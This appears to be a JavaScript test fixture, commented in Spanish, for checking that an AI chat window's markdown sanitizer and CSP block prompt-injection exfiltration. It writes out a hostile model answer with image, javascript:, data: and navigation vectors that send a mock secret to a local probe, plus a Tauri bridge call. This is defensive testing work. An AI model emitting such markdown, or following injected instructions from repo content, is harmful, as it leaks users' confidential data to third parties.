/**
 * La respuesta que el agente devuelve cuando el material que leyó traía
 * instrucciones. Es el patrón de comparación de `attacks/window.mjs`.
 *
 * **No hace falta un agente malicioso.** El agente lee el repo del cliente, y un
 * README, un issue o un comentario de código pueden pedir «cita este gráfico» con
 * una URL ajena detrás. Lo que llega a la ventana del chat es esto: markdown que
 * escribió el modelo sobre contenido que no es de confianza.
 *
 * **No se toca**, por la misma razón que `hostile-artifact.html`: si los vectores
 * cambian, ninguna corrida anterior sirve de referencia. Lo nuevo se prueba
 * añadiendo archivos, no editando el control.
 *
 * Solo hay vectores que `Markdown.tsx` **pueda emitir**: una imagen y un enlace.
 * No emite HTML crudo —comprobado con `<script>` y con `<img onerror>`— así que
 * un vector que necesite otra etiqueta mediría el saneador de otro, no el nuestro.
 */

/** Donde escucha `probe.mjs`. Cada línea de su registro es material que salió. */
export const SONDA = "http://127.0.0.1:8788";

/** Lo que el agente leyó del cliente y no debería salir de la máquina. */
export const SECRETO = "SALARIOS-Q3-CONFIDENCIAL";

/**
 * Siete vectores, y **tres de ellos tienen que seguir funcionando**: sin la
 * mitad que debe pasar, «no salió nada» se lee igual que «el candado funciona»
 * y que «rompí el chat».
 *
 * | Vector | Qué prueba |
 * |---|---|
 * | `img-inline` | Una imagen remota sale **sin un clic**, en cuanto se pinta |
 * | `img-referencia` | La misma directiva por la otra sintaxis de markdown |
 * | `a-javascript` | Ejecuta al pulsar: cambia la página, saca datos y llama al puente de Tauri |
 * | `a-data` | El otro esquema que ejecuta |
 * | `a-navegacion` | Un `http:` se lleva la ventana entera, y la CSP no gobierna la navegación |
 * | CONTROL `img-data` | Una imagen embebida es inerte y **tiene que pintarse** |
 * | CONTROL `a-https` | Un enlace legítimo **tiene que seguir siendo un enlace** |
 */
export const RESPUESTA_HOSTIL = `# Informe Q3

El material del cliente dice que el margen cayó. Aquí el desglose y sus fuentes.

![gráfico del margen](${SONDA}/fuga/img-inline?d=${SECRETO})

![el mismo gráfico, por referencia][grafico]

![diagrama embebido](data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==)

- [Ver el detalle][js]
- [Abrir el informe][datos]
- [Fuente original](${SONDA}/fuga/a-navegacion?d=${SECRETO})
- [Documentación del producto](https://ejemplo.test/doc)

[grafico]: ${SONDA}/fuga/img-referencia?d=${SECRETO}
[js]: <javascript:document.title="SECUESTRADA";fetch("${SONDA}/fuga/a-javascript?d="+encodeURIComponent(document.body.innerText.slice(0,60)));window.__TAURI_INTERNALS__.invoke("open_external",{target:"${SONDA}/fuga/invoke"})>
[datos]: data:text/html;base64,PHNjcmlwdD5mZXRjaCgiaHR0cDovLzEyNy4wLjAuMTo4Nzg4L2Z1Z2EvZGF0YS1lc3F1ZW1hIik8L3NjcmlwdD4=
`;

/**
 * Un artefacto legítimo, para la otra mitad del encargo: **cerrar la ventana no
 * puede romper el contenedor**.
 *
 * Un marco `srcdoc` hereda la política del documento que lo embebe, así que
 * apretar la de la ventana puede matar el runtime del artefacto —que es un
 * `<script>` en línea— sin que nadie lo note hasta abrir un documento. Este
 * archivo lleva las tres cosas que el contenedor necesita y la ventana no: script
 * en línea, estilo en línea e imagen `data:`.
 *
 * Que esté vivo se mide por su propio canal: el runtime manda `harness: "estado"`
 * al cargar. Si la herencia lo mata, ese mensaje no llega.
 */
export const ARTEFACTO_LEGITIMO = `<h1 style="color:#333">Informe trimestral</h1>
<p>Margen del 18,4 % sobre <strong>1.284.500</strong> de ingreso.</p>
<img alt="punto" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==">
<table><thead><tr><th>Trimestre</th><th>Ingreso</th></tr></thead>
<tbody><tr><td>Q3</td><td>1284500</td></tr></tbody></table>`;
